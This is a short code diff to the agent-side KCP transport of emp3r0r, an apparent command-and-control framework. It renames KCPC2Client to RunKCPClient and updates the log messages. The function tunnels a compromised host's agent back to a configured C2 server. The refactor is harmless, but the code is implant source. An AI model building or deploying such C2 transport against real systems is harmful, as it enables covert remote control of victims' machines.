@@ -3,6 +3,7 @@ package c2transport
 import (
 	"context"
 	"fmt"
+
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -15,8 +16,8 @@ var (
 	KCPC2Cancel context.CancelFunc
 )
 
-// Connect to C2 KCP server, then to C2 server
-func KCPC2Client() {
+// RunKCPClient Connect to C2 KCP server, then to C2 server
+func RunKCPClient() {
 	if !common.RuntimeConfig.UseKCP {
 		return
 	}
@@ -25,13 +26,13 @@ func KCPC2Client() {
 	// this context ends when agent exits
 	KCPC2Ctx, KCPC2Cancel = context.WithCancel(context.Background())
 	defer func() {
-		logging.Print("KCPC2Client exited")
+		logging.Print("RunKCPClient exited")
 		KCPC2Cancel()
 	}()
 	kcp_server_addr := fmt.Sprintf("%s:%s", common.RuntimeConfig.CCAddress, common.RuntimeConfig.KCPServerPort)
 	err := transport.KCPTunClient(kcp_server_addr, common.RuntimeConfig.KCPClientPort,
 		common.RuntimeConfig.Password, def.MagicString, KCPC2Ctx, KCPC2Cancel)
 	if err != nil {
-		logging.Printf("KCPC2Client failed to start: %v", err)
+		logging.Printf("RunKCPClient failed to start: %v", err)
 	}
 }
